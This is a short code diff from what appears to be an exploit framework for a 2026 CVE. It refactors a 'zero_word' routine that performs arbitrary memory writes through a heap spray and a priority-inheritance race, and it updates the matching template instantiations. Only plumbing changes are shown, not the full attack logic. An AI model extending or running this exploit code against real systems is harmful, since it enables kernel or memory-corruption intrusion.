@@ -485,11 +485,10 @@ namespace ghostlock::session::backend {
     /* One route write: middleware resident fast path, else heap spray + PI race.
      * Shared statement order; the middleware policy decides the resident step. */
     template <class M>
-    Status Cve2026_43499Policy::zero_word(ExploitSession &session, uintptr_t target,
-                                         const char *desc) {
+    Status Cve2026_43499Policy::zero_word(uintptr_t target, const char *desc) {
         const memory::WriteRequest request =
                 memory::WriteRequest::make(target, memory::WriteMode::Zero, 1);
-        return attack_write<M>(session, request, desc);
+        return attack_write<M>(g_exploit_session, request, desc);
     }
 
     template <class M>
@@ -583,13 +582,11 @@ namespace ghostlock::session::backend {
         ExploitSession &, const memory::WriteRequest &, const char *);
     template Status Cve2026_43499Policy::attack_write<route::TcpPolicy>(
         ExploitSession &, const memory::WriteRequest &, const char *);
-    template Status Cve2026_43499Policy::zero_word<route::SelectPolicy>(ExploitSession &, uintptr_t,
-                                                                     const char *);
-    template Status Cve2026_43499Policy::zero_word<route::TcpPolicy>(ExploitSession &, uintptr_t,
-                                                                    const char *);
-    template Status Cve2026_43499Policy::zero_word<route::MulticastPolicy>(ExploitSession &,
-                                                                           uintptr_t,
-                                                                           const char *);
+    template Status Cve2026_43499Policy::zero_word<route::SelectPolicy>(uintptr_t,
+                                                                       const char *);
+    template Status Cve2026_43499Policy::zero_word<route::TcpPolicy>(uintptr_t, const char *);
+    template Status Cve2026_43499Policy::zero_word<route::MulticastPolicy>(uintptr_t,
+                                                                          const char *);
 
     template Status Cve2026_43499Policy::attack_write<route::MulticastPolicy>(
         ExploitSession &, const memory::WriteRequest &, const char *);
